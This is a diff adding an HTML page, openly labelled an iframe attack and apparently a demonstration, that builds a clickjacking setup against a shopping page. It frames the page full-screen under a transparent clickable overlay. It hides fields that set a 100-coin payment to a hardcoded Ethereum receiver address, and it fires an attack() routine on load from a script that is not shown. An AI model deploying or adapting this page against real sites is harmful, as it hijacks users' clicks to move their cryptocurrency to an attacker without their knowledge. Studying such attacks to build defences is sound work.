@@ -1,0 +1,32 @@
+<html>
+<head>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/shopping.css">
+    <style>
+    #cover {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: transparent;
+    z-index: 1;
+    cursor:pointer;
+    }
+</style>
+</head>
+<body class="content" onload="attack()">
+    <!--<h1>Iframe Attack</h1>-->
+    <iframe src="./shopping.html" id="victimframe" style="border: 0; width: 100%; height: 100%"></iframe>
+    <div hidden>
+        <input class="form-control" type="text" id='amount' value="100">
+        <input class="form-control" type="text" id='ethAccount' placeholder="receiver's account" value="0xb29e83adf438093335246510051100c8ce8a1b25">
+    </div>
+    <button hidden class="btn btn-warning" id='submitButton'>Buy with MetaCoin!</button>
+    <div id='cover'><a></a></div>
+
+    <script type="text/javascript" src="js/jquery.js"></script>
+    <script type="text/javascript" src="js/iframeAttack.js"></script>
+    <script type="text/javascript" src="js/bootstrap.min.js"></script>
+</body>
+</html>
